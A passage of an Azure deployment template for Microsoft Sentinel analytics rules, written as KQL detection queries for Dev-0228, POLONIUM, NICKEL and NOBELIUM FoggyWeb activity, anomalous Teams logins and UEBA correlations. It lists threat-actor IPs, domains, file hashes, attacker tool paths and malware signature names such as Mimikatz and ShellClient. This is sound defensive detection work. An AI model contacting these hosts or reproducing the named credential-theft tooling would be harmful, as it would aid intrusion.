them\n| extend UEBAWindowStart = UEBAEventTime - 1h, UEBAWindowEnd = UEBAEventTime + 6h\n| where StartTime between (UEBAWindowStart .. UEBAWindowEnd)\n| project StartTime, EndTime, Subscription, VirtualMachineName, Caller, CallerIpAddress, UEBAEventTime, UEBAActionType, UEBASourceIPLocation, UEBAActivityInsights, UEBAUsersInsights\n| extend timestamp = StartTime, AccountCustomEntity=Caller, IPCustomEntity=CallerIpAddress",
          "queryFrequency": "P1D",
          "queryPeriod": "P2D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "LateralMovement",
            "CredentialAccess"
          ],
          "techniques": [
            "T1570",
            "T1212"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "11bda520-a965-4654-9a45-d09f372f71aa",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.5"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/c9f5d5d6-54c0-42bb-840c-3092637e6783')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/c9f5d5d6-54c0-42bb-840c-3092637e6783')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Dev-0228 File Path Hashes November 2021",
          "description": "This hunting query looks for file paths/hashes related to observed activity by Dev-0228. The actor is known to use custom version of popular tool like PsExec, Procdump etc. to carry its activity.\n The risk score associated with each result is based on a number of factors, hosts with higher risk events should be investigated first.",
          "severity": "High",
          "enabled": true,
          "query": "let files1 = dynamic([\"C:\\\\Windows\\\\TAPI\\\\lsa.exe\", \"C:\\\\Windows\\\\TAPI\\\\pa.exe\", \"C:\\\\Windows\\\\TAPI\\\\pc.exe\", \"C:\\\\Windows\\\\TAPI\\\\Rar.exe\"]);\nlet files2 = dynamic([\"svchost.exe\",\"wdmsvc.exe\"]);\nlet FileHash1 = dynamic([\"43109fbe8b752f7a9076eaafa417d9ae5c6e827cd5374b866672263fdebd5ec3\", \"ab50d8d707b97712178a92bbac74ccc2a5699eb41c17aa77f713ff3e568dcedb\", \"010e32be0f86545e116a8bc3381a8428933eb8789f32c261c81fd5e7857d4a77\",         \"56cd102b9fc7f3523dad01d632525ff673259dbc9a091be0feff333c931574f7\"]);\nlet FileHash2 = dynamic([\"2a1044e9e6e87a032f80c6d9ea6ae61bbbb053c0a21b186ecb3b812b49eb03b7\", \"9ab7e99ed84f94a7b6409b87e56dc6e1143b05034a5e4455e8c555dbbcd0d2dd\", \"18a072ccfab239e140d8f682e2874e8ff19d94311fc8bb9564043d3e0deda54b\"]);\nDeviceProcessEvents\n| where ( FolderPath has_any (files1) and SHA256 has_any (FileHash1)) or (FolderPath has_any (files2) and SHA256 has_any (FileHash2))\n| extend DvcId = DeviceId\n| join kind=leftouter (SecurityAlert\n| where ProviderName =~ \"MDATP\"\n| extend ThreatName = tostring(parse_json(ExtendedProperties).ThreatName)\n| mv-expand todynamic(Entities)\n| extend DvcId = tostring(parse_json(Entities).MdatpDeviceId)\n| where isnotempty(DvcId)\n// Higher risk score are for Defender alerts related to threat actor\n| extend AlertRiskScore = iif(ThreatName has_any (\"Backdoor:MSIL/ShellClient.A\", \"Backdoor:MSIL/ShellClient.A!dll\", \"Trojan:MSIL/Mimikatz.BA!MTB\"), 1.0, 0.5)\n| project DvcId, AlertRiskScore) on DvcId\n| extend AlertRiskScore = iif(isempty(AlertRiskScore), 0.0, AlertRiskScore)\n| extend timestamp = TimeGenerated, HostCustomEntity = DeviceName, AccountCustomEntity = AccountName",
          "queryFrequency": "PT6H",
          "queryPeriod": "PT6H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CredentialAccess",
            "Execution"
          ],
          "techniques": [
            "T1569",
            "T1003"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "3b443f22-9be9-4c35-ac70-a94757748439",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "File",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "FileName"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.1"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/3209c4c6-58cf-4b7b-a004-9e2f42e75293')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/3209c4c6-58cf-4b7b-a004-9e2f42e75293')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Anomalous login followed by Teams action",
          "description": "Detects anomalous IP address usage by user accounts and then checks to see if a suspicious Teams action is performed.\nQuery calculates IP usage Delta for each user account and selects accounts where a delta >= 90% is observed between the most and least used IP.\nTo further reduce results the query performs a prevalence check on the lowest used IP's country, only keeping IP's where the country is unusual for the tenant (dynamic ranges)\nFinally the user accounts activity within Teams logs is checked for suspicious commands (modifying user privileges or admin actions) during the period the suspicious IP was active.",
          "severity": "Medium",
          "enabled": true,
          "query": "//The bigger the window the better the data sample size, as we use IP prevalence, more sample data is better.\n//The minimum number of countries that the account has been accessed from [default: 2]\nlet minimumCountries = 2;\n//The delta (%) between the largest in-use IP and the smallest [default: 95]\nlet deltaThreshold = 95;\n//The maximum (%) threshold that the country appears in login data [default: 10]\nlet countryPrevalenceThreshold = 10;\n//The time to project forward after the last login activity [default: 60min]\nlet projectedEndTime = 60m;\nlet queryfrequency = 1d;\nlet queryperiod = 14d;\nlet aadFunc = (tableName: string) {\n    // Get successful signins to Teams\n    let signinData =\n        table(tableName)\n        | where TimeGenerated > ago(queryperiod)\n        | where AppDisplayName has \"Teams\" and ConditionalAccessStatus =~ \"success\"\n        | extend Country = tostring(todynamic(LocationDetails)['countryOrRegion'])\n        | where isnotempty(Country) and isnotempty(IPAddress);\n    // Calculate prevalence of countries\n    let countryPrevalence =\n        signinData\n        | summarize CountCountrySignin = count() by Country\n        | extend TotalSignin = toscalar(signinData | summarize count())\n        | extend CountryPrevalence = toreal(CountCountrySignin) / toreal(TotalSignin) * 100;\n    // Count signins by user and IP address\n    let userIpSignin =\n        signinData\n        | summarize CountIPSignin = count(), Country = any(Country), ListSigninTimeGenerated = make_list(TimeGenerated) by IPAddress, UserPrincipalName;\n    // Calculate delta between the IP addresses with the most and minimum activity by user\n    let userIpDelta =\n        userIpSignin\n        | summarize MaxIPSignin = max(CountIPSignin), MinIPSignin = min(CountIPSignin), DistinctCountries = dcount(Country), make_set(Country) by UserPrincipalName\n        | extend UserIPDelta = toreal(MaxIPSignin - MinIPSignin) / toreal(MaxIPSignin) * 100;\n    // Collect Team operations the user account has performed within a time range of the suspicious signins\n    OfficeActivity\n    | where TimeGenerated > ago(queryfrequency)\n    | where Operation in~ (\"TeamsAdminAction\", \"MemberAdded\", \"MemberRemoved\", \"MemberRoleChanged\", \"AppInstalled\", \"BotAddedToTeam\")\n    | project OperationTimeGenerated = TimeGenerated, UserId = tolower(UserId), Operation\n    | join kind = inner(\n        userIpDelta\n        // Check users with activity from distinct countries\n        | where DistinctCountries >= minimumCountries\n        // Check users with high IP delta\n        | where UserIPDelta >= deltaThreshold\n        // Add information about signins and countries\n        | join kind = leftouter userIpSignin on UserPrincipalName\n        | join kind = leftouter countryPrevalence on Country\n        // Check activity that comes from nonprevalent countries\n        | where CountryPrevalence < countryPrevalenceThreshold\n        | project\n            UserPrincipalName,\n            SuspiciousIP = IPAddress,\n            UserIPDelta,\n            SuspiciousSigninCountry = Country,\n            SuspiciousCountryPrevalence = CountryPrevalence,\n            EventTimes = ListSigninTimeGenerated\n    ) on $left.UserId == $right.UserPrincipalName\n    // Check the signins occured 60 min before the Teams operations\n    | mv-expand SigninTimeGenerated = EventTimes\n    | extend SigninTimeGenerated = todatetime(SigninTimeGenerated)\n    | where OperationTimeGenerated between (SigninTimeGenerated .. (SigninTimeGenerated + projectedEndTime))\n};\nlet aadSignin = aadFunc(\"SigninLogs\");\nlet aadNonInt = aadFunc(\"AADNonInteractiveUserSignInLogs\");\nunion isfuzzy=true aadSignin, aadNonInt\n| summarize arg_max(SigninTimeGenerated, *) by UserPrincipalName, SuspiciousIP, OperationTimeGenerated\n| summarize\n    ActivitySummary = make_bag(pack(tostring(SigninTimeGenerated), pack(\"Operation\", tostring(Operation), \"OperationTime\", OperationTimeGenerated)))\n    by UserPrincipalName, SuspiciousIP, SuspiciousSigninCountry, SuspiciousCountryPrevalence\n| extend IPCustomEntity = SuspiciousIP, AccountCustomEntity = UserPrincipalName",
          "queryFrequency": "P1D",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess",
            "Persistence"
          ],
          "techniques": [
            "T1199",
            "T1136",
            "T1078",
            "T1098"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "2b701288-b428-4fb8-805e-e4372c574786",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.1"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/bc035482-9643-4b6c-a5aa-fc905f86d40c')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/bc035482-9643-4b6c-a5aa-fc905f86d40c')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Known POLONIUM IP",
          "description": "Identifies a match across various data feeds for IP IOCs related to the POLONIUM activity group.  \n References: BLOGURL' ",
          "severity": "High",
          "enabled": true,
          "query": "let IPList = dynamic([\"135.125.147.170:80\",\"185.244.129.79:63047\",\"185.244.129.79:80\",\"45.80.149.108:63047\",\"45.80.149.108:80\",\"45.80.149.57:63047\",\"45.80.149.68:63047\",\"45.80.149.71:80\",\"185.244.129.109\",\"172.96.188.51\",\"51.83.246.73\"]); \n(union isfuzzy=true \n(CommonSecurityLog \n| where isnotempty(SourceIP) or isnotempty(DestinationIP) \n| where SourceIP in (IPList) or DestinationIP in (IPList) or Message has_any (IPList) \n| extend IPMatch = case(SourceIP in (IPList), \"SourceIP\", DestinationIP in (IPList), \"DestinationIP\", \"Message\")  \n| summarize StartTimeUtc = min(TimeGenerated), EndTimeUtc = max(TimeGenerated) by SourceIP, DestinationIP, DeviceProduct, DeviceAction, Message, Protocol, SourcePort, DestinationPort, DeviceAddress, DeviceName, IPMatch \n| extend timestamp = StartTimeUtc, IPCustomEntity = case(IPMatch == \"SourceIP\", SourceIP, IPMatch == \"DestinationIP\", DestinationIP, \"IP in Message Field\")  \n), \n(OfficeActivity \n|extend SourceIPAddress = ClientIP, Account = UserId \n| where  SourceIPAddress in (IPList) \n| extend timestamp = TimeGenerated , IPCustomEntity = SourceIPAddress , AccountCustomEntity = Account \n),\n(_Im_Dns (response_has_any_prefix=IPList)\n| extend DestinationIPAddress = ResponseName,  Host = SrcIpAddr \n| extend timestamp = TimeGenerated, IPCustomEntity = DestinationIPAddress, HostCustomEntity = Host \n), \n(_Im_NetworkSession (srcipaddr_has_any_prefix=IPList)\n | extend timestamp = TimeGenerated, IPCustomEntity = SrcIpAddr, HostCustomEntity = Hostname, AccountCustomEntity=User\n), \n(_Im_NetworkSession (dstipaddr_has_any_prefix=IPList)\n| extend timestamp = TimeGenerated, IPCustomEntity = DstIpAddr, HostCustomEntity = Hostname , AccountCustomEntity = User\n), \n(WireData  \n| where isnotempty(RemoteIP) \n| where RemoteIP in (IPList) \n| extend timestamp = TimeGenerated, IPCustomEntity = RemoteIP, HostCustomEntity = Computer \n), \n(SigninLogs \n| where isnotempty(IPAddress) \n| where IPAddress in (IPList) \n| extend timestamp = TimeGenerated, AccountCustomEntity = UserPrincipalName, IPCustomEntity = IPAddress \n),\n(AADNonInteractiveUserSignInLogs \n| where isnotempty(IPAddress) \n| where IPAddress in (IPList) \n| extend timestamp = TimeGenerated, AccountCustomEntity = UserPrincipalName, IPCustomEntity = IPAddress \n), \n(W3CIISLog  \n| where isnotempty(cIP) \n| where cIP in (IPList) \n| extend timestamp = TimeGenerated, IPCustomEntity = cIP, HostCustomEntity = Computer, AccountCustomEntity = csUserName \n), \n(AzureActivity  \n| where isnotempty(CallerIpAddress) \n| where CallerIpAddress in (IPList) \n| extend timestamp = TimeGenerated, IPCustomEntity = CallerIpAddress, AccountCustomEntity = Caller \n), \n( \nAWSCloudTrail \n| where isnotempty(SourceIpAddress) \n| where SourceIpAddress in (IPList) \n| extend timestamp = TimeGenerated, IPCustomEntity = SourceIpAddress, AccountCustomEntity = UserIdentityUserName \n), \n( \nDeviceNetworkEvents \n| where isnotempty(RemoteIP)  \n| where RemoteIP in (IPList)  \n| extend timestamp = TimeGenerated, IPCustomEntity = RemoteIP, HostCustomEntity = DeviceName  \n),\n(\nAzureDiagnostics\n| where ResourceType == \"AZUREFIREWALLS\"\n| where Category == \"AzureFirewallApplicationRule\"\n| parse msg_s with Protocol 'request from ' SourceHost ':' SourcePort 'to ' DestinationHost ':' DestinationPort '. Action:' Action\n| where isnotempty(DestinationHost)\n| where DestinationHost has_any (IPList)  \n| extend DestinationIP = DestinationHost \n| extend IPCustomEntity = SourceHost\n),\n(\nAzureDiagnostics\n| where ResourceType == \"AZUREFIREWALLS\"\n| where Category == \"AzureFirewallNetworkRule\"\n| parse msg_s with Protocol 'request from ' SourceHost ':' SourcePort 'to ' DestinationHost ':' DestinationPort '. Action:' Action\n| where isnotempty(DestinationHost)\n| where DestinationHost has_any (IPList)  \n| extend DestinationIP = DestinationHost \n| extend IPCustomEntity = SourceHost\n)\n)",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": "95407904-0131-4918-bc49-ebf282ce149a",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.0"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/21c9bf0d-7c86-4793-a72d-b3d0c351669d')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/21c9bf0d-7c86-4793-a72d-b3d0c351669d')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Known NICKEL domains and hashes",
          "description": "IOC domains and hash values for tools and malware used by NICKEL. \n Matches domain name, hash IOCs and M365 Defender sigs related to the NICKEL activity group with CommonSecurityLog, DnsEvents, VMConnection and SecurityEvents dataTypes.",
          "severity": "High",
          "enabled": true,
          "query": "let DomainNames = dynamic([\"beesweiserdog.com\", \n                          \"bluehostfit.com\", \n                          \"business-toys.com\", \n                          \"cleanskycloud.com\", \n                          \"cumberbat.com\", \n                          \"czreadsecurity.com\", \n                          \"dgtresorgouv.com\", \n                          \"dimediamikedask.com\", \n                          \"diresitioscon.com\", \n                          \"elcolectador.com\", \n                          \"elperuanos.org\", \n                          \"eprotectioneu.com\", \n                          \"fheacor.com\", \n                          \"followthewaterdata.com\", \n                          \"francevrteepress.com\", \n                          \"futtuhy.com\", \n                          \"gardienweb.com\", \n                          \"heimflugaustr.com\", \n                          \"ivpsers.com\", \n                          \"jkeducation.org\", \n                          \"micrlmb.com\", \n                          \"muthesck.com\", \n                          \"netscalertech.com\", \n                          \"newgoldbalmap.com\", \n                          \"news-laestrella.com\", \n                          \"noticialif.com\", \n                          \"opentanzanfoundation.com\", \n                          \"optonlinepress.com\", \n                          \"palazzochigi.com\", \n                          \"pandemicacre.com\", \n                          \"papa-ser.com\", \n                          \"pekematclouds.com\", \n                          \"pipcake.com\", \n                          \"popularservicenter.com\", \n                          \"projectsyndic.com\", \n                          \"qsadtv.com\", \n                          \"sankreal.com\", \n                          \"scielope.com\", \n                          \"seoamdcopywriting.com\", \n                          \"slidenshare.com\", \n                          \"somoswake.com\", \n                          \"squarespacenow.com\", \n                          \"subapostilla.com\", \n                          \"suzukicycles.net\", \n                          \"tatanotakeeps.com\", \n                          \"tijuanazxc.com\", \n                          \"transactioninfo.net\", \n                          \"eurolabspro.com\", \n                          \"adelluminate.com\", \n                          \"headhunterblue.com\", \n                          \"primenuesty.com\" \n                          ]);\nlet SHA256Hashes = dynamic ([\"02daf4544bcefb2de865d0b45fc406bee3630704be26a9d6da25c9abe906e7d2\", \n                            \"0a45ec3da31838aa7f56e4cbe70d5b3b3809029f9159ff0235837e5b7a4cb34c\", \n                            \"0d7965489810446ca7acc7a2160795b22e452a164261313c634a6529a0090a0c\", \n                            \"10bb4e056fd19f2debe61d8fc5665434f56064a93ca0ec0bef946a4c3e098b95\", \n                            \"12d914f24fe5501e09f5edf503820cc5fe8b763827a1c6d44cdb705e48651b21\", \n                            \"1899f761123fedfeba0fee6a11f830a29cd3653bcdcf70380b72a05b921b4b49\", \n                            \"22e68e366dd3323e5bb68161b0938da8e1331e4f1c1819c8e84a97e704d93844\", \n                            \"259783405ec2cb37fdd8fd16304328edbb6a0703bc3d551eba252d9b450554ef\", \n                            \"26debed09b1bbf24545e3b4501b799b66a0146d4020f882776465b5071e91822\", \n                            \"35c5f22bb11f7dd7a2bb03808e0337cb7f9c0d96047b94c8afdab63efc0b9bb2\", \n                            \"3ae2d9ffa4e53519e62cc0a75696f9023f9cce09b0a917f25699b48d0f7c4838\", \n                            \"3bac2e459c69fcef8c1c93c18e5f4f3e3102d8d0f54a63e0650072aeb2a5fa65\", \n                            \"3c0bf69f6faf85523d9e60d13218e77122b2adb0136ffebbad0f39f3e3eed4e6\", \n                            \"3dc0001a11d54925d2591aec4ea296e64f1d4fdf17ff3343ddeea82e9bd5e4f1\", \n                            \"3fd73af89e94af180b1fbf442bbfb7d7a6c4cf9043abd22ac0aa2f8149bafc90\", \n                            \"6854df6aa0af46f7c77667c450796d5658b3058219158456e869ebd39a47d54b\", \n                            \"6b79b807a66c786bd2e57d1c761fc7e69dd9f790ffab7ce74086c4115c9305ce\", \n                            \"7944a86fbef6238d2a55c14c660c3a3d361c172f6b8fa490686cc8889b7a51a0\", \n                            \"926904f7c0da13a6b8689c36dab9d20b3a2e6d32f212fca9e5f8cf2c6055333c\", \n                            \"95e98c811ea9d212673d0e84046d6da94cbd9134284275195800278593594b5a\", \n                            \"a142625512e5372a1728595be19dbee23eea50524b4827cb64ed5aaeaaa0270b\", \n                            \"afe5e9145882e0b98a795468a4c0352f5b1ddb7b4a534783c9e8fc366914cf6a\", \n                            \"b9027bad09a9f5c917cf0f811610438e46e42e5e984a8984b6d69206ceb74124\", \n                            \"c132d59a3bf0099e0f9f5667daf7b65dba66780f4addd88f04eecae47d5d99fa\", \n                            \"c9a5765561f52bbe34382ce06f4431f7ac65bafe786db5de89c29748cf371dda\", \n                            \"ce0408f92635e42aadc99da3cc1cbc0044e63441129c597e7aa1d76bf2700c94\", \n                            \"ce47bacc872516f91263f5e59441c54f14e9856cf213ca3128470217655fc5e6\", \n                            \"d0fe4562970676e30a4be8cb4923dc9bfd1fca8178e8e7fea0f3f02e0c7435ce\", \n                            \"d5b36648dc9828e69242b57aca91a0bb73296292bf987720c73fcd3d2becbae6\", \n                            \"e72d142a2bc49572e2d99ed15827fc27c67fc0999e90d4bf1352b075f86a83ba\"\n                            ]);\nlet SigNames = dynamic([\"Backdoor:Win32/Leeson\", \"Trojan:Win32/Kechang\", \"Backdoor:Win32/Nightimp!dha\", \"Trojan:Win32/QuarkBandit.A!dha\", \"TrojanSpy:Win32/KeyLogger\"]);\n(union isfuzzy=true\n(CommonSecurityLog \n| parse Message with * '(' DNSName ')' * \n| where isnotempty(FileHash)\n| where FileHash in (SHA256Hashes) or DNSName in~ (DomainNames)\n| extend Account = SourceUserID, Computer = DeviceName, IPAddress = SourceIP\n),\n(_Im_Dns(domain_has_any = DomainNames)\n| extend DNSName = DnsQuery\n| extend IPAddress = SrcIpAddr\n),\n(_Im_WebSession(url_has_any = DomainNames)\n| extend DNSName = tostring(parse_url(Url)[\"Host\"])\n| extend IPAddress = SrcIpAddr\n),\n(Event\n//This query uses sysmon data depending on table name used this may need updataing\n| where Source == \"Microsoft-Windows-Sysmon\"\n| extend EvData = parse_xml(EventData)\n| extend EventDetail = EvData.DataItem.EventData.Data\n| extend Hashes = EventDetail.[16].[\"#text\"]\n| parse Hashes with * 'SHA256=' SHA256 ',' * \n| where isnotempty(Hashes)\n| where Hashes in (SHA256Hashes) \n| extend Account = UserName\n),\n(DeviceFileEvents\n| where SHA256 in~ (SHA256Hashes)\n| extend Account = RequestAccountName, Computer = DeviceName, IPAddress = RequestSourceIP, CommandLine = InitiatingProcessCommandLine, FileHash = SHA256\n| project Type, TimeGenerated, Computer, Account, IPAddress, CommandLine, FileHash\n),\n(imFileEvent\n| where TargetFileSHA256 in~ (SHA256Hashes)\n| extend Account = ActorUsername, Computer = DvcHostname, IPAddress = SrcIpAddr, CommandLine = ActingProcessCommandLine, FileHash = TargetFileSHA256\n| project Type, TimeGenerated, Computer, Account, IPAddress, CommandLine, FileHash\n),\n(DeviceNetworkEvents\n| where RemoteUrl in~ (DomainNames)\n| extend Computer = DeviceName, IPAddress = LocalIP, Account = InitiatingProcessAccountName\n| project Type, TimeGenerated, Computer, Account, IPAddress, RemoteUrl\n),\n(SecurityAlert\n| where ProductName == \"Microsoft Defender Advanced Threat Protection\"\n| extend ThreatName = tostring(parse_json(ExtendedProperties).ThreatName)\n| where isnotempty(ThreatName)\n| where ThreatName has_any (SigNames)\n| extend Computer = tostring(parse_json(Entities)[0].HostName)\n),\n(AzureDiagnostics \n| where ResourceType == \"AZUREFIREWALLS\"\n| where Category == \"AzureFirewallApplicationRule\"\n| parse msg_s with Protocol 'request from ' SourceHost ':' SourcePort 'to ' DestinationHost ':' DestinationPort '. Action:' Action\n| where isnotempty(DestinationHost)\n| where DestinationHost has_any (DomainNames)  \n| extend DNSName = DestinationHost \n| extend IPAddress = SourceHost\n)\n)\n| extend timestamp = TimeGenerated, AccountCustomEntity = Account, HostCustomEntity = Computer, IPCustomEntity = IPAddress",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl"
          ],
          "techniques": [
            "T1071"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "9122a9cb-916b-4d98-a199-1b7b0af8d598",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.2.1"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/8ccf799f-e7ac-40ae-98cb-aa16343ab2a4')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/8ccf799f-e7ac-40ae-98cb-aa16343ab2a4')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "NOBELIUM IOCs related to FoggyWeb backdoor",
          "description": "Identifies a match across various data feeds for IOCs related to FoggyWeb backdoor by the threat actor NOBELIUM.\n FoggyWeb is a passive and highly targeted backdoor capable of remotely exfiltrating sensitive information from a compromised AD FS server.\n It can also receive additional malicious components from a command-and-control (C2) server and execute them on the compromised server.\n Reference: https://aka.ms/nobelium-foggy-web",
          "severity": "High",
          "enabled": true,
          "query": "let iocs = externaldata(DateAdded:string,IoC:string,Type:string,TLP:string) [@\"https://raw.githubusercontent.com/Azure/Azure-Sentinel/master/Sample%20Data/Feeds/FoggyWebIOC.csv\"] with (format=\"csv\", ignoreFirstRecord=True);\nlet sha256Hashes = (iocs | where Type == \"sha256\" | project IoC);\nlet FilePaths = (iocs | where Type =~ \"FilePath\" | project IoC);\nlet POST_URI = (iocs | where Type =~ \"URI1\" | project IoC);\nlet GET_URI = (iocs | where Type =~ \"URI2\" | project IoC);\n//Include in the list below, the ADFS servers you know about in your environment.  In the next part of the query, we will try to identify them for you if you have the telemetry.\nlet ADFS_Servers1 = datatable(Computer:string)\n[ \"<ADFS01>.<DOMAIN>.<COM>\",\n\"<ADFS02>.<DOMAIN>.<COM>\"\n];\n// Automatically identify potential ADFS services in your environment by searching process event telemetry for \"Microsoft.IdentityServer.ServiceHost.exe\".\nlet ADFS_Servers2 = \n(union isfuzzy=true\n(SecurityEvent\n| where EventID == 4688 and SubjectLogonId != \"0x3e4\"\n| where ProcessName has \"Microsoft.IdentityServer.ServiceHost.exe\"\n| distinct Computer\n),\n( WindowsEvent\n| where EventID == 4688 and EventData has \"Microsoft.IdentityServer.ServiceHost.exe\" and EventData has \"0x3e4\"\n| extend ProcessName = tostring(EventData.ProcessName)\n| where ProcessName == \"Microsoft.IdentityServer.ServiceHost.exe\"\n| extend SubjectLogonId = tostring(EventData.SubjectLogonId)\n| where SubjectLogonId != \"0x3e4\"\n| distinct Computer\n),\n(DeviceProcessEvents\n| where InitiatingProcessFileName == 'Microsoft.IdentityServer.ServiceHost.exe'\n| extend Computer = DeviceName\n| distinct Computer\n),\n(Event\n| where Source == \"Microsoft-Windows-Sysmon\"\n| where EventID == 1\n| extend EventData = parse_xml(EventData).DataItem.EventData.Data\n| mv-expand bagexpansion=array EventData\n| evaluate 